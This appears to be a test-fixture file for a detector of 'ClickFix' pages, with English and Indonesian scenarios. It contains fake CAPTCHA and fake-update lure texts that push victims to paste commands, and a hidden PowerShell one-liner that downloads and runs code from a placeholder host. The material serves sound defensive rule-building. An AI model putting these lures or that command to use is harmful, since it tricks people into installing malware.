// Dev-split scenarios in snapshot form (EVALUATION_PLAN.md §6). Payloads are defanged
// (example.invalid, 192.0.2.0/24). These are used to design rules; they are NOT a held-out test set.
import type { PageSnapshot, RuleId, Verdict } from '../../src/core/types.js';
import { inContainer, snapshot } from './build.js';

export interface Scenario {
  id: string;
  kind: 'positive' | 'negative' | 'ambiguous';
  lang: 'en' | 'id';
  description: string;
  snapshot: PageSnapshot;
  expect: { verdict: Verdict; rules?: RuleId[] };
}

const STAGED_PS = 'powershell -w hidden -c "iex (irm https://example.invalid/v)"';
const ARTICLE = { article: true };
const CODE = { article: true, pre: true, code: true };
const QUOTE = { article: true, quote: true };

export const SCENARIOS: Scenario[] = [
  // ---------------- Positives ----------------
  {
    id: 'S-P1-en', kind: 'positive', lang: 'en',
    description: 'Fake CAPTCHA modal: Win+R → Ctrl+V → Enter, hidden staged command, verify button',
    snapshot: snapshot(
      [
        { t: 'Welcome to our recipe blog', c: 'header' },
        ...inContainer('modal', [
          'Verify you are human',
          'Complete these verification steps:',
          '1. Press Windows Key + R',
          '2. Press CTRL + V',
          '3. Press Enter',
        ], { dialog: true }),
      ],
      {
        hidden: [{ text: STAGED_PS, containerId: 'modal', afterBlockId: 'b1' }],
        triggers: [{ label: "I'm not a robot", containerId: 'modal', afterBlockId: 'b1' }],
      },
    ),
    expect: { verdict: 'manipulative_instruction', rules: ['R1'] },
  },
  {
    id: 'S-P1-id', kind: 'positive', lang: 'id',
    description: 'CAPTCHA palsu berbahasa Indonesia dengan urutan Win+R → Ctrl+V → Enter',
    snapshot: snapshot(inContainer('modal', [
      'Verifikasi bahwa Anda manusia',
      'Langkah verifikasi:',
      'Tekan tombol Windows + R',
      'Tekan Ctrl + V',
      'Tekan Enter',
    ], { dialog: true })),
    expect: { verdict: 'manipulative_instruction', rules: ['R1'] },
  },
  {
    id: 'S-P2-en', kind: 'positive', lang: 'en',
    description: 'Malicious instruction presented as account verification (authority + urgency, no CAPTCHA)',
    snapshot: snapshot(inContainer('notice', [
      'Microsoft Security Team',
      'Unusual activity detected. Your account will be suspended within 24 hours.',
      'To keep access, open PowerShell, paste the verification code and press Enter.',
    ])),
    expect: { verdict: 'suspicious_correlation', rules: ['R4'] },
  },
  {
    id: 'S-P2-id', kind: 'positive', lang: 'id',
    description: 'Verifikasi akun palsu: otoritas + urgensi + instruksi PowerShell',
    snapshot: snapshot(inContainer('notice', [
      'Pemberitahuan dari Tim Keamanan',
      'Akun Anda akan diblokir dalam 24 jam.',
      'Untuk verifikasi akun, buka PowerShell, tempelkan kode lalu tekan Enter.',
    ])),
    expect: { verdict: 'suspicious_correlation', rules: ['R4'] },
  },
  {
    id: 'S-P3-en', kind: 'positive', lang: 'en',
    description: 'Fake browser update with visible PowerShell one-liner and copy button',
    snapshot: snapshot(
      inContainer('overlay', [
        'Chrome update required',
        'Failed to display this page with your current browser version.',
        'Click the Copy button, open PowerShell, paste it and press Enter.',
        STAGED_PS,
      ]),
      { triggers: [{ label: 'Copy', containerId: 'overlay', afterBlockId: 'b3' }] },
    ),
    expect: { verdict: 'suspicious_correlation', rules: ['R4'] },
  },
  {
    id: 'S-P3-id', kind: 'positive', lang: 'id',
    description: 'Pembaruan browser palsu dengan perintah PowerShell dan tombol salin',
    snapshot: snapshot(
      inContainer('overlay', [
        'Terjadi kesalahan saat memuat halaman. Pembaruan browser diperlukan.',
        'Klik tombol Salin, buka PowerShell, tempelkan kode lalu tekan Enter.',
        STAGED_PS,
      ]),
      { triggers: [{ label: 'Salin', containerId: 'overlay', afterBlockId: 'b2' }] },
    ),
    expect: { verdict: 'suspicious_correlation', rules: ['R4'] },
  },
  {
    id: 'S-P4-en', kind: 'positive', lang: 'en',
    description: 'Benign blog post; a user comment contains a ClickFix instruction (T7, UGC)',
    snapshot: snapshot([
      ...inContainer('post', [
        'Ten tips for faster sourdough',
        'Let the dough rest for at least 12 hours before shaping. Use a warm spot in your kitchen.',
      ], ARTICLE),
      ...inContainer('comment-3', [
        'Admin: to verify you are human before commenting, press Win+R, then Ctrl+V and Enter.',
      ], { ugc: true }),
    ]),
    expect: { verdict: 'manipulative_instruction', rules: ['R1'] },
  },
  {
    id: 'S-P6-en', kind: 'positive', lang: 'en',
    description: 'macOS variant: Cmd+Space → Terminal → Cmd+V → Return',
    snapshot: snapshot(inContainer('modal', [
      'Verify you are human',
      'Press Cmd + Space and type Terminal.',
      'Press Cmd + V, then press Return.',
    ], { dialog: true })),
    expect: { verdict: 'manipulative_instruction', rules: ['R1'] },
  },
  {
    id: 'S-P7-en', kind: 'positive', lang: 'en',
    description: 'Obfuscated: Cyrillic homoglyphs and zero-width characters inside the lure',
    snapshot: snapshot(inContainer('modal', [
      'Vеrify yоu are h​uman',
      'Prеss Wіn + R',
      'Prеss Ctrl​ + V',
      'Press Entеr',
    ])),
    expect: { verdict: 'manipulative_instruction', rules: ['R1'] },
  },

  // ---------------- Hard negatives ----------------
  {
    id: 'S-N1-en', kind: 'negative', lang: 'en',
    description: 'Security tutorial quoting the lure and command in code blocks',
    snapshot: snapshot([
      ...inContainer('article', [
        'ClickFix pages show a fake CAPTCHA and push visitors into running commands. Here is what a typical lure looks like, so you can recognise it.',
      ], ARTICLE, 'How to spot ClickFix attacks'),
      ...inContainer('article', [
        'Verify you are human. 1. Press Win+R 2. Press Ctrl+V 3. Press Enter',
        STAGED_PS,
      ], CODE, 'How to spot ClickFix attacks'),
    ]),
    expect: { verdict: 'observed_instruction' },
  },
  {
    id: 'S-N1-id', kind: 'negative', lang: 'id',
    description: 'Tutorial keamanan yang mengutip instruksi dalam blok kode',
    snapshot: snapshot([
      ...inContainer('article', [
        'Halaman ClickFix menampilkan CAPTCHA palsu. Berikut contoh modus yang sering dipakai agar Anda bisa mengenalinya.',
      ], ARTICLE, 'Cara mengenali serangan ClickFix'),
      ...inContainer('article', [
        'Verifikasi bahwa Anda manusia. Tekan Win + R, tekan Ctrl + V, lalu tekan Enter.',
      ], CODE, 'Cara mengenali serangan ClickFix'),
    ]),
    expect: { verdict: 'observed_instruction' },
  },
  {
    id: 'S-N2-en', kind: 'negative', lang: 'en',
    description: 'Legitimate account-security warning without any execution request',
    snapshot: snapshot(inContainer('main', [
      'We detected a new sign-in to your account from Chrome on Windows.',
      "If this wasn't you, review your activity and change your password within 24 hours.",
    ])),
    expect: { verdict: 'none' },
  },
  {
    id: 'S-N2-id', kind: 'negative', lang: 'id',
    description: 'Peringatan keamanan akun yang sah tanpa instruksi eksekusi',
    snapshot: snapshot(inContainer('main', [
      'Kami mendeteksi login baru ke akun Anda dari perangkat Windows.',
      'Jika ini bukan Anda, segera ubah kata sandi. Akun Anda akan dikunci sementara jika ada aktivitas mencurigakan.',
    ])),
    expect: { verdict: 'none' },
  },
  {
    id: 'S-N3-en', kind: 'negative', lang: 'en',
    description: 'Normal checkout countdown and scarcity',
    snapshot: snapshot(inContainer('checkout', [
      'Only 2 left in stock!',
      'Offer ends in 09:59',
      'Complete your purchase within 10 minutes to keep your reservation. Act now!',
    ])),
    expect: { verdict: 'none' },
  },
  {
    id: 'S-N4-en', kind: 'negative', lang: 'en',
    description: 'News article describing a ClickFix campaign and quoting the lure',
    snapshot: snapshot([
      ...inContainer('article', [
        'Researchers observed a campaign in which victims were instructed to press Windows + R, paste a command with Ctrl+V and press Enter.',
      ], ARTICLE),
      ...inContainer('article', ['Verify you are human. Press Win+R, then Ctrl+V and Enter.'], QUOTE),
      ...inContainer('article', ['The payload installed an information stealer, according to the report.'], ARTICLE),
    ]),
    expect: { verdict: 'observed_instruction' },
  },
  {
    id: 'S-N4-id', kind: 'negative', lang: 'id',
    description: 'Artikel berita yang melaporkan modus ClickFix',
    snapshot: snapshot([
      ...inContainer('article', [
        'Dalam modus ini, korban diminta menekan tombol Windows + R, lalu Ctrl + V dan Enter.',
      ], ARTICLE),
      ...inContainer('article', ['Verifikasi bahwa Anda manusia. Tekan Win + R, Ctrl + V, lalu Enter.'], QUOTE),
    ]),
    expect: { verdict: 'observed_instruction' },
  },
  {
    id: 'S-N5-en', kind: 'negative', lang: 'en',
    description: 'Developer docs: install script with copy button (legitimate execution request)',
    snapshot: snapshot(
      [
        ...inContainer('docs', ['Open Terminal and run the following command to install the CLI:'], ARTICLE),
        ...inContainer('docs', ['curl -fsSL https://example.invalid/install.sh | bash'], CODE),
      ],
      { triggers: [{ label: 'Copy', containerId: 'docs', afterBlockId: 'b1' }] },
    ),
    expect: { verdict: 'observed_instruction', rules: ['R5'] },
  },
  {
    id: 'S-N5-id', kind: 'negative', lang: 'id',
    description: 'Dokumentasi pengembang: buka Terminal lalu jalankan perintah instalasi',
    snapshot: snapshot([
      ...inContainer('docs', ['Buka Terminal, lalu jalankan perintah berikut untuk memasang paket:'], ARTICLE),
      ...inContainer('docs', ['npm install -g example-cli'], CODE),
    ]),
    expect: { verdict: 'observed_instruction', rules: ['R5'] },
  },
  {
    id: 'S-N6-en', kind: 'negative', lang: 'en',
    description: 'Awareness page using negation',
    snapshot: snapshot(inContainer('main', [
      'Never press Win+R and paste code that a website gives you.',
      'If a page asks you to verify you are human by pressing Ctrl+V and Enter, close it.',
    ])),
    expect: { verdict: 'none' },
  },
  {
    id: 'S-N6-id', kind: 'negative', lang: 'id',
    description: 'Halaman edukasi dengan negasi',
    snapshot: snapshot(inContainer('main', [
      'Jangan pernah tekan Win + R lalu tempel kode dari situs web.',
      'Jika halaman meminta Anda verifikasi bahwa Anda manusia dengan menekan Ctrl + V dan Enter, tutup halaman tersebut.',
    ])),
    expect: { verdict: 'none' },
  },
  {
    id: 'S-N7-id', kind: 'negative', lang: 'id',
    description: 'Halaman edukasi penipuan bank: dalih tanpa instruksi eksekusi',
    snapshot: snapshot(inContainer('main', [
      'Penipu mengaku sebagai petugas bank atau Tim Keamanan.',
      'Mereka bilang akun Anda akan diblokir dalam 24 jam.',
      'Mereka meminta kode OTP. Jangan berikan kepada siapa pun.',
    ], ARTICLE, 'Waspadai modus penipuan')),
    expect: { verdict: 'none' },
  },

  // ---------------- Ambiguous / adversarial ----------------
  {
    id: 'S-A1-en', kind: 'ambiguous', lang: 'en',
    description: 'Partial chain with strong pretext (no paste step)',
    snapshot: snapshot(inContainer('modal', ['Verify you are human: press Win+R, type the code shown and press Enter.'])),
    expect: { verdict: 'suspicious_correlation', rules: ['R3'] },
  },
  {
    id: 'S-A2-en', kind: 'ambiguous', lang: 'en',
    description: 'Adversarial affirmative idiom before the chain ("don\'t worry") is not negation',
    snapshot: snapshot(inContainer('modal', [
      "Don't worry, just verify you are human: press Win+R, then Ctrl+V and press Enter.",
    ])),
    expect: { verdict: 'manipulative_instruction', rules: ['R1'] },
  },
  {
    id: 'S-A3-en', kind: 'ambiguous', lang: 'en',
    description: 'Adversarial negation cue separated by a comma does not negate the action',
    snapshot: snapshot(inContainer('modal', [
      'Verify you are human. Do not close this window, press Win+R, then Ctrl+V and press Enter.',
    ])),
    expect: { verdict: 'manipulative_instruction', rules: ['R1'] },
  },
  {
    id: 'S-A5-en', kind: 'ambiguous', lang: 'en',
    description: 'Adversarial negation joined by a conjunction ("do not refresh … and press") does not negate the action',
    snapshot: snapshot(inContainer('modal', [
      'Verify you are human. Do not refresh this page and press Win+R, then Ctrl+V and press Enter.',
    ])),
    expect: { verdict: 'manipulative_instruction', rules: ['R1'] },
  },
  {
    id: 'S-A5-id', kind: 'ambiguous', lang: 'id',
    description: 'Negasi adversarial dengan kata sambung ("jangan tutup … lalu tekan") tidak menegasi aksi',
    snapshot: snapshot(inContainer('modal', [
      'Verifikasi bahwa Anda manusia. Jangan tutup halaman ini lalu tekan Win + R, tekan Ctrl + V, lalu tekan Enter.',
    ])),
    expect: { verdict: 'manipulative_instruction', rules: ['R1'] },
  },
  {
    id: 'S-A4-en', kind: 'ambiguous', lang: 'en',
    description: 'Staged command in a hidden copy target plus verify button (stage 1 of ClickFix)',
    snapshot: snapshot(
      inContainer('modal', ['Verify you are human', 'Click the "Verify" button to continue.']),
      {
        hidden: [{ text: STAGED_PS, containerId: 'modal', afterBlockId: 'b0' }],
        triggers: [{ label: 'Verify', containerId: 'modal', afterBlockId: 'b1' }],
      },
    ),
    expect: { verdict: 'manipulative_instruction', rules: ['R2'] },
  },
];

/** Documented limitations: the engine's current behavior on cases we consider wrong or debatable. */
export const KNOWN_LIMITATIONS: Scenario[] = [
  {
    id: 'S-N8-en', kind: 'negative', lang: 'en',
    description: 'KNOWN FALSE POSITIVE: internal IT page asks employees to run an approved script (authority cue)',
    snapshot: snapshot([
      ...inContainer('main', [
        'IT Department notice',
        'To install the approved VPN client, open PowerShell as administrator, paste the command below and press Enter.',
      ], ARTICLE),
      ...inContainer('main', ['Install-Module ExampleVpn -Scope CurrentUser'], CODE),
    ]),
    expect: { verdict: 'suspicious_correlation', rules: ['R4'] },
  },
  {
    id: 'S-L2-en', kind: 'ambiguous', lang: 'en',
    description: 'KNOWN FALSE POSITIVE (debatable): troubleshooting doc with "fix this error" + delivered install script',
    snapshot: snapshot(
      [
        ...inContainer('docs', ['To fix this error, open Terminal and run:'], ARTICLE),
        ...inContainer('docs', ['curl -fsSL https://example.invalid/fix.sh | bash'], CODE),
      ],
      { triggers: [{ label: 'Copy', containerId: 'docs', afterBlockId: 'b1' }] },
    ),
    expect: { verdict: 'suspicious_correlation', rules: ['R4'] },
  },
  {
    id: 'S-L3-en', kind: 'positive', lang: 'en',
    description: 'KNOWN FALSE NEGATIVE: paraphrased lure outside the lexicon',
    snapshot: snapshot(inContainer('modal', [
      'Prove your humanity',
      'Hold the flag key and tap R, insert what we gave you, then confirm with the big key.',
    ])),
    expect: { verdict: 'none' },
  },
];
